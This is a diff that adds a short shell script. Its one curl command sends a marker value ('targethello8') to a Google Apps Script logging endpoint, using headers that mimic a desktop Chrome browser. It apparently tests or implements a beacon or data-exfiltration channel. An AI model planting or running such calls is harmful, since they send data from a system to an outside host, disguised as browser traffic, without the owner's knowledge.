@@ -1,0 +1,8 @@
+#!/bin/sh
+curl -L -s \
+  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Referer: https://script.google.com/' \
+  -H 'Origin: https://script.google.com' \
+  'https://script.google.com/macros/s/AKfycbwabSXEa73Agrj0Wyo8vdk5p6KGLMBA2i9BQNJLbnxAYhMGlbO7J0cxZKqntktIs1K8/exec?action=log&d=targethello8'
